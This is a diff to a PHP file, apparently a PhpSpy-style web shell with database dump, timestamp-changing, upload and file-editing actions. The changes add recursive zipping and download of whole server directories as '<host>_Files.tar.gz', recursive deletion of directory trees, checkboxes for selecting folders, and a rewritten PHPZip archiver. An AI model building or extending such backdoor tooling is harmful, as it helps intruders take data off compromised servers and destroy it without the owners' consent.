@@ -396,7 +396,9 @@ if ($doing == 'mysqldown') {
 
 					// 上传文件
 					elseif ($doupfile) {
-						m('File upload ' . (@copy($_FILES['uploadfile']['tmp_name'], $uploaddir . '/' . $_FILES['uploadfile']['name']) ? 'success' : 'failed'));
+						// 使用 move_uploaded_file 代替 copy，更安全可靠
+						$dest_file = $uploaddir . '/' . $_FILES['uploadfile']['name'];
+						m('File upload ' . (@move_uploaded_file($_FILES['uploadfile']['tmp_name'], $dest_file) ? 'success' : 'failed'));
 					}
 
 					// 编辑文件
@@ -458,35 +460,76 @@ if ($doing == 'mysqldown') {
 					// 打包下载
 					elseif ($doing == 'downrar') {
 						if ($dl) {
-							$dfiles = '';
+							// 创建一个 PHPZip 对象来处理所有选中的文件和文件夹
+							$zip = new PHPZip(array());
+							
+							// 清空静态变量，确保每次调用都能正确获取文件列表
+							$zip->a = array();
+							
+							// 处理选择的文件和文件夹
 							foreach ($dl as $filepath => $value) {
-								$dfiles .= $filepath . ',';
+								if (is_file($filepath)) {
+									// 处理单个文件
+									$fd = fopen($filepath, 'r');
+									$content = @fread($fd, filesize($filepath));
+									fclose($fd);
+									// 添加文件到压缩包，使用basename作为文件名
+									$zip->addFile($content, basename($filepath));
+								} elseif (is_dir($filepath)) {
+									// 处理文件夹，递归获取所有文件
+									$base_dir = basename($filepath);
+									$filelist = getAllFiles($filepath);
+									if (is_array($filelist)) {
+										foreach ($filelist as $file) {
+											if (is_file($file)) {
+												$fd = fopen($file, 'r');
+												$content = @fread($fd, filesize($file));
+												fclose($fd);
+												// 计算相对路径，确保文件在文件夹内
+												$relative_path = substr($file, strlen($filepath) + 1);
+												$in_zip_name = $base_dir . '/' . $relative_path;
+												$zip->addFile($content, $in_zip_name);
+											}
+										}
+									}
+								}
 							}
-							$dfiles = substr($dfiles, 0, strlen($dfiles) - 1);
-							$dl = explode(',', $dfiles);
-							$zip = new PHPZip($dl);
-							$code = $zip->out;
+							
+							// 生成压缩包
+							$zip->out = $zip->file();
+							
+							// 输出压缩包
 							header('Content-type: application/octet-stream');
 							header('Accept-Ranges: bytes');
-							header('Accept-Length: ' . strlen($code));
+							header('Accept-Length: ' . strlen($zip->out));
 							header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_Files.tar.gz');
-							echo $code;
+							echo $zip->out;
 							exit;
 						} else {
-							m('Please select file(s)');
+							m('Please select file(s) or directory(ies)');
 						}
 					}
 
-					// 批量删除文件
+					// 批量删除文件和文件夹
 					elseif ($doing == 'delfiles') {
 						if ($dl) {
 							$dfiles = '';
 							$succ = $fail = 0;
 							foreach ($dl as $filepath => $value) {
-								if (@unlink($filepath)) {
-									$succ++;
+								if (@is_dir($filepath)) {
+									// 递归删除文件夹
+									if (deltree($filepath)) {
+										$succ++;
+									} else {
+										$fail++;
+									}
 								} else {
-									$fail++;
+									// 删除文件
+									if (@unlink($filepath)) {
+										$succ++;
+									} else {
+										$fail++;
+									}
 								}
 							}
 							m('Deleted file have finished，choose ' . count($dl) . ' success ' . $succ . ' fail ' . $fail);
@@ -732,12 +775,17 @@ if ($doing == 'mysqldown') {
 					}
 					@sort($dirdata);
 					@sort($filedata);
+					p('<form id="filelist" name="filelist" action="' . $self . '" method="post">');
+					makehide('action', 'file');
+					makehide('thefile');
+					makehide('doing');
+					makehide('dir', $nowpath);
 					$dir_i = '0';
 					foreach ($dirdata as $key => $dirdb) {
 						if ($dirdb['filename'] != '..' && $dirdb['filename'] != '.') {
 							$thisbg = bg();
-							p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
-							p('<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>');
+					p('<tr class="' . $thisbg . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $thisbg . '\';">');
+					p('<td width="2%" nowrap><input type="checkbox" value="1" name="dl[' . $dirdb['server_link'] . ']"></td>');
 							p('<td><a href="javascript:godir(\'' . $dirdb['server_link'] . '\');">' . $dirdb['filename'] . '</a></td>');
 							p('<td nowrap>' . $dirdb['mtime'] . '</td>');
 							p('<td nowrap>--</td>');
@@ -759,11 +807,6 @@ if ($doing == 'mysqldown') {
 					}
 
 					p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
-					p('<form id="filelist" name="filelist" action="' . $self . '" method="post">');
-					makehide('action', 'file');
-					makehide('thefile');
-					makehide('doing');
-					makehide('dir', $nowpath);
 					$file_i = '0';
 					foreach ($filedata as $key => $filedb) {
 						if ($filedb['filename'] != '..' && $filedb['filename'] != '.') {
@@ -1481,73 +1524,6 @@ if ($doing == 'mysqldown') {
 							setTimeout(initEditor, 100);
 						}
 					</script>';
-
-					// Initialize CodeMirror for edit file page
-					echo '<script>
-						// Wait for DOM to be ready
-						setTimeout(function() {
-							if (typeof CodeMirror !== "undefined" && document.getElementById("filecontent")) {
-								window.codeMirrorEditor = CodeMirror.fromTextArea(document.getElementById("filecontent"), {
-									lineNumbers: true,
-									mode: "text/plain",
-									theme: "monokai",
-									indentUnit: 4,
-									tabSize: 4,
-									lineWrapping: true,
-									autoCloseBrackets: true,
-									matchBrackets: true,
-									indentWithTabs: false
-								});
-								
-								// Set mode based on file extension
-								var filename = "' . $opfile . '";
-								if (filename) {
-									var extension = filename.split(".").pop().toLowerCase();
-									var modeMap = {
-										"php": "php",
-										"js": "javascript",
-										"html": "htmlmixed",
-										"htm": "htmlmixed",
-										"css": "css",
-										"xml": "xml",
-										"sql": "sql",
-										"json": "application/json",
-										"py": "python",
-										"pl": "perl",
-										"sh": "shell",
-										"bat": "batch",
-										"htaccess": "apache",
-										"log": "text/plain",
-										"txt": "text/plain",
-										"md": "markdown",
-										"yml": "yaml",
-										"yaml": "yaml"
-									};
-									
-									if (modeMap[extension]) {
-										window.codeMirrorEditor.setOption("mode", modeMap[extension]);
-									}
-								}
-								
-								// Refresh editor after a short delay
-								setTimeout(function() {
-									if (window.codeMirrorEditor) {
-										window.codeMirrorEditor.refresh();
-									}
-								}, 200);
-								
-								// Sync content before form submission
-								var forms = document.getElementsByTagName("form");
-								for (var i = 0; i < forms.length; i++) {
-									forms[i].addEventListener("submit", function() {
-										if (window.codeMirrorEditor) {
-											window.codeMirrorEditor.save();
-										}
-									});
-								}
-							}
-						}, 100);
-					</script>';
 				} //end editfile
 
 				elseif ($action == 'newtime') {
@@ -2125,25 +2101,60 @@ class PHPZip
 	{
 		if (@function_exists('gzcompress')) {
 			$curdir = getcwd();
-			if (is_array($dir)) $filelist = $dir;
-			else {
-				$filelist = $this->GetFileList($dir); //文件列表
-				foreach ($filelist as $k => $v) $filelist[] = substr($v, strlen($dir) + 1);
+			$filelist = array();
+			$base_dir = '';
+			$is_dir = is_dir($dir);
+			
+			// 保存基础目录名称
+			if ($is_dir) {
+				$base_dir = basename($dir);
 			}
-			if ((!empty($dir)) && (!is_array($dir)) && (file_exists($dir))) chdir($dir);
-			else chdir($curdir);
+			
+			if (is_array($dir)) {
+				// 处理文件列表
+				foreach ($dir as $filepath) {
+					if (is_file($filepath)) {
+						// 保留完整路径，确保文件结构正确
+						$filelist[] = $filepath;
+					}
+				}
+			} else {
+				// 处理单个文件或文件夹
+				if (is_file($dir)) {
+					// 单个文件
+					$filelist[] = $dir;
+				} elseif (is_dir($dir)) {
+					// 文件夹，获取所有文件并保留相对路径
+					$filelist = $this->GetFileList($dir);
+				}
+			}
+			
 			if (count($filelist) > 0) {
-				foreach ($filelist as $filename) {
-					if (is_file($filename)) {
-						$fd = fopen($filename, 'r');
-						$content = @fread($fd, filesize($filename));
+				foreach ($filelist as $filepath) {
+					// 构建完整文件路径
+					$full_path = $filepath;
+					if ($is_dir && !file_exists($full_path)) {
+						$full_path = $dir . '/' . $filepath;
+					}
+					
+					if (is_file($full_path)) {
+						// 打开文件并读取内容
+						$fd = fopen($full_path, 'r');
+						$content = @fread($fd, filesize($full_path));
 						fclose($fd);
-						if (is_array($dir)) $filename = basename($filename);
-						$this->addFile($content, $filename);
+						
+						// 确定在压缩包中的文件名
+						$in_zip_name = $filepath;
+						if ($is_dir) {
+							// 对于文件夹，添加基础目录前缀
+							$in_zip_name = $base_dir . '/' . $in_zip_name;
+						}
+						
+						// 添加文件到压缩包
+						$this->addFile($content, $in_zip_name);
 					}
 				}
 				$this->out = $this->file();
-				chdir($curdir);
 			}
 			return 1;
 		} else return 0;
@@ -2153,13 +2164,27 @@ class PHPZip
 	function GetFileList($dir)
 	{
 		static $a;
+		static $base_dir;
+		
+		// 保存基础目录
+		if (!isset($base_dir)) {
+			$base_dir = $dir;
+		}
+		
 		if (is_dir($dir)) {
 			if ($dh = opendir($dir)) {
 				while ($file = readdir($dh)) {
 					if ($file != '.' && $file != '..') {
 						$f = $dir . '/' . $file;
-						if (is_dir($f)) $this->GetFileList($f);
-						$a[] = $f;
+						if (is_dir($f)) {
+							// 递归处理子目录
+							$this->GetFileList($f);
+						} else {
+							// 计算相对路径
+							$relative_path = substr($f, strlen($base_dir) + 1);
+							// 只添加文件，不添加目录
+							$a[] = $relative_path;
+						}
 					}
 				}
 				closedir($dh);
@@ -2251,6 +2276,32 @@ class PHPZip
 		$ctrldir = implode('', $this->ctrl_dir);
 		return $data . $ctrldir . $this->eof_ctrl_dir . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) .	pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
 	}
+}
+
+// 递归获取文件夹中的所有文件
+function getAllFiles($dir)
+{
+	$files = array();
+	if (@is_dir($dir)) {
+		$handle = @opendir($dir);
+		if ($handle) {
+			while (($file = @readdir($handle)) !== false) {
+				if ($file != '.' && $file != '..') {
+					$filepath = $dir . '/' . $file;
+					if (@is_dir($filepath)) {
+						// 递归处理子文件夹
+						$sub_files = getAllFiles($filepath);
+						$files = array_merge($files, $sub_files);
+					} else {
+						// 添加文件
+						$files[] = $filepath;
+					}
+				}
+			}
+			@closedir($handle);
+		}
+	}
+	return $files;
 }
 
 // 备份数据库
